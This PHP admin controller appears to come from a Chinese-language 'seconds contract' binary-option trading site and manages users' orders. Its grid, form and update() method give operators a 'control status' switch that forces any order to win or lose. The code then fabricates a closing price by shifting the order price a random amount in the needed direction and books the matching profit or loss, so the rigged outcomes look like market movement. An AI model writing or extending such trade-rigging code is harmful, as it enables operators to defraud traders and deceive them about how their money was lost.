<?php

namespace App\Admin\Controllers;


use App\Admin\Renderable\UserTradeStatistics;
use App\Admin\Renderable\UserWalletExpand;
use App\Models\Agent;
use App\Models\SecondOrder;
use App\Models\SecondConfig;
use App\Models\AgentGrade;
use App\Models\Country;
use App\Models\User;
use App\Models\UserGrade;
use Dcat\Admin\Admin;
use Dcat\Admin\Form;
use Dcat\Admin\Grid;
use Dcat\Admin\Show;
use Dcat\Admin\Controllers\AdminController;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use App\Admin\Actions\User\AddSystemUser;
use App\Admin\Actions\User\AddUser;
use App\Admin\Renderable\Parents;

class SecondOrderController extends AdminController
{
    protected $title = '秒合约订单管理';

    protected function grid()
    {
        $query = SecondOrder::with(['user','tradepair','second'])->orderBy('id','desc');
        //return Grid::make($query, function (Grid $grid) use ($query) {
        return Grid::make($query, function (Grid $grid) use ($query) {
            $grid->toolsWithOutline();
            $grid->column('user_id', '用户ID');
            $grid->column('user.username', '用户名');
            $grid->column('id', '订单编号');
            $grid->column('tradepair.pair_name', '交易对');
            $grid->column('amount', '购买金额');
            $grid->column('second.seconds', '秒数')->display(function($val){
                return '<span class="label" style="background:#3085d6">'.$val.'</span>';
            });
            $grid->column('expected', '方向')->display(function ($val) {
                return $val ? '<span class="label" style="background:#21b978">买涨</span>' : '<span class="label" style="background:#ea5455">买跌</span>';
            });
            $grid->column('order_price', '下单点位');
            $grid->column('close_price', '平仓点位');
            $grid->column('close_status', '平仓状态')->display(function ($val) {
                return $val ? '未平仓' : '<span class="label" style="background:#21b978">已平仓</span>';
            });
            
            $grid->column('result_status', '结果状态')->display(function($val){
                $txt = '<span class="label" style="background:#3085d6">未知</span>';
                if($val==1) $txt = '<span class="label" style="background:#21b978">赢</span>';
                if($val==2) $txt = '<span class="label" style="background:#ea5455">输</span>';
                return $txt;
            });
            $grid->column('charge', '手续费');
            $grid->column('profit', '收益');
            $grid->column('updated_at', '平仓时间');
            $grid->column('created_at', '创建时间');
            $grid->column('control_status', '管控状态')->select([0=>'默认',1 => '赢',2 => '输'],true);
            $grid -> disableViewButton ();
            //$grid->disableActions();
            $grid->showCreateButton();
        });
    }
    /**
     * Make a form builder.
     *
     * @return Form
     */
    protected function form()
    {
        return Form::make(SecondOrder::with(['user','tradepair','second']), function (Form $form) {
            $form->text('user.username', '用户名');
            $form->text('id', '订单编号');
            $form->text('tradepair.pair_name', '交易对');
            $form->text('amount', '购买金额');
            $form->text('second.seconds', '秒数');
            $form->select('expected', '方向')->options([1 => '买涨', 0 => '买跌']);
            $form->text('order_price', '下单点位');
            $form->text('close_price', '平仓点位');
            $form->text('profit', '收益');
            $form->select('close_status', '平仓状态')->options([1 => '未平仓', 0 => '已平仓']);
            $form->select('result_status', '结果状态')->options([0 => '默认',1 => '赢', 2 => '输']);
            $form->select('control_status', '管控状态')->options([0 => '默认',1 => '赢', 2 => '输']);
            
        });
    }
    public function randomFloat($min = 0, $max = 1) {
   	   $num = $min + mt_rand() / mt_getrandmax() * ($max - $min);
   	   return sprintf("%.2f",$num);
	}
    public function update($id)
    {
        $control_status = request()->input('control_status');
        $offset = $this->randomFloat(0.1010,1.9090);
        //return $offset;
        $order = SecondOrder::where('id',$id)->first();
        $order->timestamps = false;
        $conf = SecondConfig::where('id',$order->second_id)->first();
        $profit = $conf->profit_rate / 100 * $order->amount;
        //$org->order_price;
        if (request()->ajax() && !request()->pjax()){
            if($control_status==2 && $order->expected==1){
                //SecondOrder::where('id',$id)->update(['close_status'=>0,'result_status'=>2,'control_status'=>2,'close_price'=>$orer->order_price-$offset,'profit'=>-$profit]);
                $order->fill(['close_status'=>0,'result_status'=>2,'control_status'=>2,'close_price'=>$order->order_price-$offset,'profit'=>-$profit]);
                $order->save();
            }
            if($control_status==2 && $order->expected==0){
                //SecondOrder::where('id',$id)->update(['close_status'=>0,'result_status'=>2,'control_status'=>2,'close_price'=>$order->order_price+$offset,'profit'=>-$profit]);
                $order->fill(['close_status'=>0,'result_status'=>2,'control_status'=>2,'close_price'=>$order->order_price+$offset,'profit'=>-$profit]);
                $order->save();
            }
            if($control_status==1 &&  $order->expected==1){
                //SecondOrder::where('id',$id)->update(['close_status'=>0,'result_status'=>1,'control_status'=>1,'close_price'=>$order->order_price+$offset,'profit'=>$profit]);
                $order->fill(['close_status'=>0,'result_status'=>1,'control_status'=>1,'close_price'=>$order->order_price+$offset,'profit'=>$profit]);
                $order-> save();
            }
            
            if($control_status==1 &&  $order->expected==0){
                //SecondOrder::where('id',$id)->update(['close_status'=>0,'result_status'=>1,'control_status'=>1,'close_price'=>$order->order_price-$offset,'profit'=>$profit]);
                $order->fill(['close_status'=>0,'result_status'=>1,'control_status'=>1,'close_price'=>$order->order_price-$offset,'profit'=>$profit]);
                $order -> save();
            }
            
            if($control_status==0){
                $order->control_status = 0;
                $order->save();
                //SecondOrder::where('id',$id)->update(['control_status'=>0]);
            }
        }
    }
}
